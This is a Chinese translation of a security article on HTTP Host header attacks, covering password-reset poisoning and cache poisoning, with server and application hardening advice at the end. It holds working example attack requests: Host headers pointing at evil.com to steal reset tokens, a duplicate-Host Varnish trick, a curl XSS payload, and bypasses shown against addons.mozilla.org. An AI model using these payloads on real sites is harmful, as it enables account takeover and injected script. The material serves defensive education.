# 利用HTTP host头攻击的技术

from:[http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html](http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)

0x00 背景
-------

* * *

一般通用web程序是如果想知道网站域名不是一件简单的事情，如果用一个固定的URI来作为域名会有各种麻烦。开发人员一般是依赖HTTP Host header（比如在php里是`_SERVER["HTTP_HOST"]`），而这个header很多情况下是靠不住的。而很多应用是直接把这个值不做html编码便输出到了页面中，比如：

```
<link href="http://_SERVER['HOST']"    (Joomla)

```

还有的地方还包含有secret key和token，

```
<a href="http://_SERVER['HOST']?token=topsecret">  (Django, Gallery, others)

```

这样处理问题一般会很容易遭遇到两种常见的攻击：缓存污染和密码重置。缓存污染是指攻击者通过控制一个缓存系统来将一个恶意站点的页面返回给用户。密码重置这种攻击主要是因为发送给用户的内容是可以污染的，也就是说可以间接的劫持邮件发送内容。

0x01 密码重置污染攻击
-------------

* * *

拿[Gallery](http://galleryproject.org/)这个站来做例子。当我们进行密码重置的时候，网站会给我们发送一个随机的key：

```
$user -> hash = random::hash() ;

$message -> confirm_url = url::abs_site("password/do_reset?key=$user->hash") ;

```

当用户点击重置密码的链接时，肯定可以说明点的是自己的账户。

![enter image description here](http://drops.javaweb.org/uploads/images/a55f9de570a3f1edde16c658974997446dbcaf0a.jpg)

这个地方的漏洞是：`url::abs_site`这一部分使用的Host header是来自用户重置密码的请求，那么攻击者可以通过一个受他控制的链接来污染密码重置的邮件。

```
> POST /password/reset HTTP/1.1
> Host: evil.com
> ...
> csrf=1e8d5c9bceb16667b1b330cc5fd48663&name=admin

```

这个漏洞在Django，Piwik 和Joomla中都存在，还有一些其他的应用，框架和类库。

当然这种攻击方式一定要能骗取用户点击访问这个受污染的链接，如果用户警觉了没有点击，那么攻击就会失败。当然你自己也可以配合一些社会工程学的方法来保证攻击的成功率。

还有一些情况，Host可能会被url编码后直接放到email的header里面造成header注入。通过这个，攻击者可以很容易的就能劫持用户的账户。

0x02 缓存污染
---------

* * *

通过Host header来污染缓存的攻击方法最初是Carlos Beuno 在2008年提出来的。但是在现在的网络架构中，这种攻击还是比较困难的，因为现在的缓存设备都能够识别Host。比如对于下面的这两种情况他们绝对不会弄混淆：

```
> GET /index.html HTTP/1.1       > GET /index.html HTTP/1.1
> Host: example.com              > Host: evil.com

```

因此为了能使缓存能将污染后的response返回给用户，我们还必须让缓存服务器看到的host header 和应用看到的host header 不一样。比如说对于Varnish（一个很有名的缓存服务软件），可以使用一个复制的Host header。Varnish是通过最先到达的请求的host header来辨别host的，而Apache则是看所有请求的host，Nginx则只是看最后一个请求的host。这就意味着你可以通过下面这个请求来欺骗Varnish达到污染的目的：

```
> GET / HTTP/1.1
> Host: example.com
> Host: evil.com

```

应用本身的缓存也可能受到污染。比如Joomla就将取得的host值不经html编码便写进任意页面，而它的缓存则对这些没有任何处理。比如可以通过下面的请求来写入一个存储型的xss：

```
curl -H "Host: cow\"onerror='alert(1)'rel='stylesheet'" http://example.com/ | fgrep cow\"

```

实际上的请求是这样的：

```
> GET / HTTP/1.1
> Host: cow"onerror='alert(1)'rel='stylesheet'

```

响应其实已经受到污染：

```
<link href="http://cow"onerror='alert(1)'rel='stylesheet'/" rel="canonical"/>

```

这时只需要浏览首页看是否有弹窗就知道缓存是否已经被污染了。

0x03 安全的配置
----------

* * *

在这里我假设你可以通过任何类型的应用来发起一个http请求，而host header也是可以任意编辑的。虽然在一个http请求里，host header是用来告诉webserver该请求应该转发给哪个站点，但是事实上，这个header的作用或者说风险并不止如此。

比如如果Apache接收到一个带有非法host header的请求，它会将此请求转发给在 httpd.conf 里定义的第一个虚拟主机。因此，Apache很有可能将带有任意host header的请求转发给应用。而Django已经意识到了这个缺陷，所以它建议用户另外建立一个默认的虚拟主机，用来接受这些带有非法host header的请求，以保证Django自己的应用不接受到这些请求。

不过可以通过X-Forwarded-Host 这个header就可以绕过。Django非常清楚缓存污染的风险，并且在2011年的9月份就通过默认禁用X-Forwarded-Host这个header来修复此问题。Mozilla却在addons.mozilla.org站点忽视了此问题，我在2012年的4月发现了此问题：

```
> POST /en-US/firefox/user/pwreset HTTP/1.1
> Host: addons.mozilla.org
> X-Forwarded-Host: evil.com

```

即使Django给出了补丁，但是依然存在风险。Webserver允许在host header里面指定端口，但是它并不能通过端口来识别请求是对应的哪个虚拟主机。可以通过下面的方法来绕过：

```
> POST /en-US/firefox/user/pwreset HTTP/1.1
> Host: addons.mozilla.org:@passwordreset.net

```

这直接会导致生成一个密码重置链接：[https://addons.mozilla.org:@passwordreset.net/users/pwreset/3f6hp/3ab-9ae3db614fc0d0d036d4](https://addons.mozilla.org@passwordreset.net/users/pwreset/3f6hp/3ab-9ae3db614fc0d0d036d4)

当用户点击这个链接的时候就会发现，其实这个key已经被发送到passwordreset.net这个站点了。在我报告了此问题后，Django又推出了一个补丁：[https://www.djangoproject.com/weblog/2012/oct/17/security/](https://www.djangoproject.com/weblog/2012/oct/17/security/)

不幸的是，这个补丁只是简单的通过黑名单方式来简单的过滤[[email protected]](http://drops.com:8000/cdn-cgi/l/email-protection)文本而不是html的方式发送的，所以此补丁只需要添加一个空格就可以绕过：

```
> POST /en-US/firefox/users/pwreset HTTP/1.1
> Host: addons.mozilla.org: www.securepasswordreset.com

```

Django的后续补丁规定了host header的端口部分只能是含有数字，以规避此问题。但是在RFC2616文档中规定了，如果请求URI是一个绝对的URI，那么host是Request-URI的一部分。在请求中的任何Host header值必须被忽略。

也就是说，在Apache和Nginx（只要是遵守此文档的webserver）中，可以通过绝对uri向任意应用发送一个包含有任意host header的请求：

```
> POST https://addons.mozilla.org/en-US/firefox/users/pwreset HTTP/1.1
> Host: evil.com

```

这个请求在SERVER_NAME里面的值是addons.mozilla.org，而不是host里的evil.com。应用可以通过使用SERVER_NAME而不是host header来规避此风险，但是如果没有配合特殊配置的webserver，这个风险依然存在。可以在这里[http://stackoverflow.com/questions/2297403/http-host-vs-server-name/2297421#2297421](http://stackoverflow.com/questions/2297403/http-host-vs-server-name/2297421#2297421)看看 HTTP_HOST 和SERVER_NAME 的区别。Django官方在2013年的二月通过强制使用一个host白名单来修复了此问题。尽管如此，在很多其他的wen应用上，这种攻击方式依然屡试不爽。

0x04 服务器方面需要做的
--------------

* * *

由于http请求的特点，host header的值其实是不可信的。唯一可信的只有SERVER_NAME，这个在Apache和Nginx里可以通过设置一个虚拟机来记录所有的非法host header。在Nginx里还可以通过指定一个SERVER_NAME名单，Apache也可以通过指定一个SERVER_NAME名单并开启UseCanonicalName选项。建议两种方法同时使用。

Varnish很快会发布一个补丁。在官方补丁出来前，可以通过在配置文件里加入：

```
import std;

        sub vcl_recv {
                std.collect(req.http.host);
        }

```

来防护。

0x05 应用本身需要做的
-------------

* * *

解决这个问题其实是很困难的，因为没有完全自动化的方法来帮助站长识别哪些host 的值是值得信任的。虽然做起来有点麻烦，但是最安全的做法是：效仿Django的方法，在网站安装和初始化的时候，要求管理员提供一个可信任的域名白名单。如果这个实现起来比较困难，那至少也要保证使用SERVER_NAME而不是host header，并且鼓励用户使用安全配置做的比较好的站点。